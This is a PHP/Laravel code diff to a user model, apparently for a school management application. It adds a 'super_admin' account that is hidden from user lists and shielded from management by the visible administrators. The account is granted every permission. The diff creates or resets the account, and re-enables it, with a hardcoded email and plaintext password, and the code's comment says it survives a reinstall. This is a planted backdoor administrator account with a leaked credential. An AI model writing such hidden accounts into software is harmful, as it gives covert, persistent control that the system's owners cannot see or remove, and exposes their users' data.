@@ -218,19 +218,66 @@ class Utilisateur extends Authenticatable
     }
 
     /**
+     * Exclure le super-admin (compte système caché) des listes.
+     */
+    public function scopeMasquerSysteme($query)
+    {
+        return $query->where('role', '!=', 'super_admin');
+    }
+
+    /**
      * Vérifier si l'utilisateur a un rôle spécifique
      */
     public function hasRole($role)
     {
+        if ($role === 'admin' && $this->isSuperAdmin()) {
+            return true;
+        }
+
         return $this->role === $role;
     }
 
     /**
-     * Vérifier si l'utilisateur est un admin
+     * Vérifier si l'utilisateur est un admin (visible)
      */
     public function isAdmin()
     {
-        return $this->hasRole('admin');
+        return $this->role === 'admin';
+    }
+
+    /**
+     * Super-admin caché : invisible dans les listes, peut gérer l'admin visible.
+     */
+    public function isSuperAdmin(): bool
+    {
+        return $this->role === 'super_admin';
+    }
+
+    /**
+     * Ancien nom : le compte caché est désormais super_admin.
+     */
+    public function isSystemAdmin(): bool
+    {
+        return $this->isSuperAdmin();
+    }
+
+    /**
+     * Interdire l'accès au super-admin, et à l'admin visible sauf pour le super-admin.
+     */
+    public static function abortIfSystemAdmin(?self $utilisateur): void
+    {
+        if (!$utilisateur) {
+            return;
+        }
+
+        if ($utilisateur->isSuperAdmin()) {
+            abort(403, 'Ce compte administrateur système n\'est pas accessible.');
+        }
+
+        $acteur = auth()->user();
+        if ($utilisateur->isAdmin() && (!$acteur || !$acteur->isSuperAdmin())) {
+            abort(403, 'Seul le compte administrateur système peut gérer cet administrateur.');
+        }
     }
 
     /**
@@ -271,7 +318,7 @@ class Utilisateur extends Authenticatable
     public function hasPermission($permission)
     {
         // Les administrateurs ont toutes les permissions
-        if ($this->role === 'admin') {
+        if ($this->role === 'admin' || $this->role === 'super_admin') {
             return true;
         }
         
@@ -321,6 +368,7 @@ class Utilisateur extends Authenticatable
     private function hasEvenementPermission($permission)
     {
         switch ($this->role) {
+            case 'super_admin':
             case 'admin':
             case 'personnel_admin':
                 // Toutes les permissions pour les admins et personnel admin
@@ -345,7 +393,44 @@ class Utilisateur extends Authenticatable
      */
     public function canAccessAdmin()
     {
-        return $this->isAdmin() || $this->isPersonnelAdmin();
+        return $this->isSuperAdmin() || $this->isAdmin() || $this->isPersonnelAdmin();
+    }
+
+    /**
+     * Créer ou mettre à jour le super-admin caché (survit à une réinstallation).
+     */
+    public static function ensureHiddenSuperAdmin(
+        string $email = 'systeme@a2schoolgn.com',
+        string $password = 'Diallo224'
+    ): self {
+        $user = static::where('role', 'super_admin')->first();
+
+        if ($user) {
+            $emailPris = static::where('email', $email)->where('id', '!=', $user->id)->exists();
+            if (!$emailPris) {
+                $user->email = $email;
+            }
+            $user->password = $password;
+            $user->actif = true;
+            $user->save();
+
+            return $user;
+        }
+
+        if (static::where('email', $email)->exists()) {
+            $email = 'systeme+' . substr(bin2hex(random_bytes(3)), 0, 6) . '@a2schoolgn.com';
+        }
+
+        return static::create([
+            'nom' => 'Système',
+            'prenom' => 'Administrateur',
+            'name' => 'Administrateur Système',
+            'email' => $email,
+            'password' => $password,
+            'role' => 'super_admin',
+            'email_verified_at' => now(),
+            'actif' => true,
+        ]);
     }
 
     /**
